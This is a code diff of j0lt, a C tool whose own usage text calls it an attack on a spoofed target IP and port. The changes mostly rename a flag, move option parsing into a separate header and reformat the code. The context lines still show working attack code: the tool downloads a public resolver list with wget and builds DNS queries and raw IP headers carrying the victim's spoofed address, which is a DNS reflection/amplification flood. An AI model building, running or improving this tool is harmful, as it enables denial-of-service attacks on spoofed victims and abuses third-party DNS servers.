@@ -8,9 +8,9 @@
  * ------------------------------------------------------------
  *          ** For educational purposes only **
  * ------------------------------------------------------------
- * Usage: sudo ./j0lt -t <target> -p <port> -m <nthreads>
+ * Usage: sudo ./j0lt -t <target> -p <port> -n <nthreads>
  * (7etsuo)-$ gcc j0lt.c -o j0lt
- * (7etsuo)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
+ * (7etsuo)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -n 1337
  * ------------------------------------------------------------
  * Options:
  * [-x] will print a hexdump of the packet headers
@@ -57,6 +57,7 @@
 #include "io.h"
 #include "result.h"
 #include "process_control.h"
+#include "opts.h"
 
 typedef struct __attribute__((packed, aligned(1))) {
   uint32_t sourceaddr;
@@ -76,56 +77,56 @@ typedef struct __attribute__((packed, aligned(1))) {
 } PSEUDOHDR;
 
 #define CHECK_SUCCESS(X, MSG)             \
-  do {                                    \
-    Result_T r = X;                       \
-    if (r != RESULT_SUCCESS) {            \
-      printf("%s [error: %i]\n", MSG, r); \
-      exit(1);                            \
-    }                                     \
-  } while (false)
+do {                                    \
+  Result_T r = X;                       \
+  if (r != RESULT_SUCCESS) {            \
+    printf("%s [error: %i]\n", MSG, r); \
+    exit(1);                            \
+  }                                     \
+} while (false)
 
 #define err_exit(msg)   \
-  do {                  \
-    perror(msg);        \
-    exit(EXIT_FAILURE); \
-  } while (0)
+do {                  \
+  perror(msg);        \
+  exit(EXIT_FAILURE); \
+} while (0)
 
 #define DEFINE_INSERT_FN(typename, datatype)                               \
-  bool insert_##typename(uint8_t * *buf, size_t * buflen, datatype data) { \
-    uint64_t msb_mask, lsb_mask, bigendian_data, lsb, msb;                 \
-    size_t byte_pos, nbits;                                                \
-                                                                           \
-    if (*buflen < 1) {                                                     \
-      return false;                                                        \
-    }                                                                      \
-                                                                           \
-    nbits = sizeof(data) << 3;                                             \
-    bigendian_data = 0ULL;                                                 \
-    byte_pos = (nbits / 8) - 1;                                            \
-    lsb_mask = 0xffULL;                                                    \
-    msb_mask = (lsb_mask << nbits) - 8;                                    \
-                                                                           \
-    byte_pos = byte_pos << 3;                                              \
-    for (int i = nbits >> 4; i != 0; i--) {                                \
-      lsb = (data & lsb_mask);                                             \
-      msb = (data & msb_mask);                                             \
-      lsb <<= byte_pos;                                                    \
-      msb >>= byte_pos;                                                    \
-      bigendian_data |= lsb | msb;                                         \
-      msb_mask >>= 8;                                                      \
-      lsb_mask <<= 8;                                                      \
-      byte_pos -= (2 << 3);                                                \
-    }                                                                      \
-                                                                           \
-    data = bigendian_data == 0 ? data : bigendian_data;                    \
-    for (size_t i = sizeof(data); *buflen > 0 && i > 0; i--) {             \
-      *(*buf)++ = (data & 0xff);                                           \
-      data = (data >> 8);                                                  \
-      (*buflen)--;                                                         \
-    }                                                                      \
-                                                                           \
-    return data == 0;                                                      \
-  }
+bool insert_##typename(uint8_t * *buf, size_t * buflen, datatype data) { \
+  uint64_t msb_mask, lsb_mask, bigendian_data, lsb, msb;                 \
+  size_t byte_pos, nbits;                                                \
+  \
+  if (*buflen < 1) {                                                     \
+    return false;                                                        \
+  }                                                                      \
+  \
+  nbits = sizeof(data) << 3;                                             \
+  bigendian_data = 0ULL;                                                 \
+  byte_pos = (nbits / 8) - 1;                                            \
+  lsb_mask = 0xffULL;                                                    \
+  msb_mask = (lsb_mask << nbits) - 8;                                    \
+  \
+  byte_pos = byte_pos << 3;                                              \
+  for (int i = nbits >> 4; i != 0; i--) {                                \
+    lsb = (data & lsb_mask);                                             \
+    msb = (data & msb_mask);                                             \
+    lsb <<= byte_pos;                                                    \
+    msb >>= byte_pos;                                                    \
+    bigendian_data |= lsb | msb;                                         \
+    msb_mask >>= 8;                                                      \
+    lsb_mask <<= 8;                                                      \
+    byte_pos -= (2 << 3);                                                \
+  }                                                                      \
+  \
+  data = bigendian_data == 0 ? data : bigendian_data;                    \
+  for (size_t i = sizeof(data); *buflen > 0 && i > 0; i--) {             \
+    *(*buf)++ = (data & 0xff);                                           \
+    data = (data >> 8);                                                  \
+    (*buflen)--;                                                         \
+  }                                                                      \
+  \
+  return data == 0;                                                      \
+}
 DEFINE_INSERT_FN(byte, uint8_t)
 DEFINE_INSERT_FN(word, uint16_t)
 DEFINE_INSERT_FN(dword, uint32_t)
@@ -176,15 +177,15 @@ const char *g_args = "xdt:p:m:r:";
 const char *g_path = "./j0lt-resolv.txt";
 
 const char *g_menu = {
-    " =========================================================\n"
-    " Usage: sudo ./j0lt -t -p -m [OPTION]...                  \n"
-    " -t <target>                      : target IPv4 (spoof)   \n"
-    " -p <port>                        : target port           \n"
-    " -m <nthreads>                    : nthreads of attack    \n"
-    " -x [hexdump]                     : print hexdump         \n"
-    " -d [debug]                       : offline debug mode    \n"
-    " =========================================================\n"
-    "           7etsuo: https://github.com/7etsuo           \n"};
+  " =========================================================\n"
+  " Usage: sudo ./j0lt -t -p -n [OPTION]...                  \n"
+  " -t <target>                      : target IPv4 (spoof)   \n"
+  " -p <port>                        : target port           \n"
+  " -n <nthreads>                    : nthreads of attack    \n"
+  " -x [hexdump]                     : print hexdump         \n"
+  " -d [debug]                       : offline debug mode    \n"
+  " =========================================================\n"
+  "           7etsuo: https://github.com/7etsuo           \n"};
 
 size_t forge_j0lt_packet(char *payload, uint32_t resolvip, uint32_t spoofip,
                          uint16_t spoofport);
@@ -200,76 +201,9 @@ bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
 bool send_payload(const uint8_t *datagram, uint32_t daddr, uint16_t uh_dport,
                   size_t nwritten);
 
-typedef struct JoltOptions {
-  uint32_t spoof_ip;    // IP to spoof
-  uint16_t spoof_port;  // Port to spoof
-  uint16_t nthreads;    // nthreads of the attack
-  const char *pathptr;
-  char resolv_path[PATH_MAX];  // Path to the resolver list
-  bool debug_mode;             // Debug mode flag
-  bool hex_mode;               // Hex dump mode flag
-} JoltOptions;
-
-Result_T parse_opts(JoltOptions *opts, int argc, const char **argv);
-void init_opts(JoltOptions *opts);
-
-Result_T parse_opts(JoltOptions *opts, int argc, const char **argv) {
-  assert(argc > 0 && argv != NULL);
-
-  Result_T result = RESULT_SUCCESS;
-
-  int opt = getopt(argc, (char *const *)argv, g_args);
-  char *endptr = NULL;
-  do {
-    switch (opt) {
-      case 't':  // target
-        while (*optarg == ' ') optarg++;
-        opts->spoof_ip = inet_addr(optarg);
-        if (opts->spoof_ip == 0) err_exit("* invalid spoof ip");
-        break;
-      case 'p':  // port
-        errno = 0;
-        opts->spoof_port = (uint16_t)strtol(optarg, &endptr, 0);
-        if (errno != 0 || endptr == optarg || *endptr != '\0')
-          err_exit("* spoof port invalid");
-        break;
-      case 'm':  // nthreads [TODO] : make sure this does not exceed the number
-                 // of CPU cores
-        errno = 0;
-        opts->nthreads = (uint16_t)strtol(optarg, &endptr, 0);
-        if (errno != 0 || endptr == optarg || *endptr != '\0')
-          err_exit("* nthreads invalid");
-        break;
-      case 'x':  // hex mode
-        opts->hex_mode = true;
-        break;
-      case 'd':  // debug mode
-        opts->debug_mode = true;
-        break;
-      case -1:
-      default:  // invalid option
-        err_exit("Usage: ./j0lt -t target -p port -m nthreads [OPTION]...\n");
-    }
-  } while ((opt = getopt(argc, (char *const *)argv, g_args)) != -1);
-
-  if (opts->nthreads == 0 || opts->spoof_port == 0 || opts->spoof_ip == 0)
-    err_exit("Usage: ./j0lt -t target -p port -m nthreads [OPTION]...\n");
-
-  return result;
-}
-
-void init_opts(JoltOptions *opts) {
-  assert(opts != NULL);
-  opts->spoof_ip = 0;
-  opts->spoof_port = 0;
-  opts->nthreads = 0;
-  opts->debug_mode = false;
-  opts->hex_mode = false;
-}
-
 Result_T do_wget_resolv_list() {
   char *g_wget[] = {"/bin/wget", "-O", "/tmp/resolv.txt",
-                    "https://public-dns.info/nameservers.txt", NULL};
+    "https://public-dns.info/nameservers.txt", NULL};
 
   posix_spawnattr_t attr = {0};
   posix_spawn_file_actions_t *file_actionsp = NULL;
@@ -355,7 +289,7 @@ size_t forge_j0lt_packet(char *payload, uint32_t resolvip, uint32_t spoofip,
   status = true;
   status &= insert_dns_header(&curpos, &buflen);
   status &=
-      insert_dns_question((void **)&curpos, &buflen, url, ns_t_ns, ns_c_in);
+    insert_dns_question((void **)&curpos, &buflen, url, ns_t_ns, ns_c_in);
 
   if (status == false) return 0;
 
@@ -382,10 +316,10 @@ bool insert_dns_header(uint8_t **buf, size_t *buflen) {
   uint8_t third_byte, fourth_byte;
 
   third_byte = (DNS_RD_J0LT | DNS_TC_J0LT << 1 | DNS_AA_J0LT << 2 |
-                DNS_OPCODE_J0LT << 3 | DNS_QR_J0LT << 7);
+    DNS_OPCODE_J0LT << 3 | DNS_QR_J0LT << 7);
 
   fourth_byte = (DNS_RCODE_J0LT | DNS_CD_J0LT << 4 | DNS_AD_J0LT << 5 |
-                 DNS_Z_J0LT << 6 | DNS_RA_J0LT << 7);
+    DNS_Z_J0LT << 6 | DNS_RA_J0LT << 7);
 
   status = true;
   status &= insert_word(buf, buflen, DNS_ID_J0LT);
@@ -482,7 +416,7 @@ bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
   status &= insert_byte(buf, buflen, first_byte);
   status &= insert_byte(buf, buflen, 0x00);  // TOS
   status &=
-      insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen);  // total len
+    insert_word(buf, buflen, (IP_IHL_MIN_J0LT << 2) + ulen);  // total len
   status &= insert_word(buf, buflen, IP_ID_J0LT);
   status &= insert_word(buf, buflen, IP_OF_J0LT);
   status &= insert_byte(buf, buflen, IP_TTL_J0LT);
@@ -492,7 +426,7 @@ bool insert_ip_header(uint8_t **buf, size_t *buflen, PSEUDOHDR *pheader,
   status &= insert_dword(buf, buflen, daddr);
 
   checksum =
-      j0lt_checksum((const uint16_t *)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
+    j0lt_checksum((const uint16_t *)bufptr, (size_t)(IP_IHL_MIN_J0LT << 2));
   *buf -= 0xa;
   *(*buf)++ = (checksum & 0xff00) >> 8;
   **buf = checksum & 0xff;
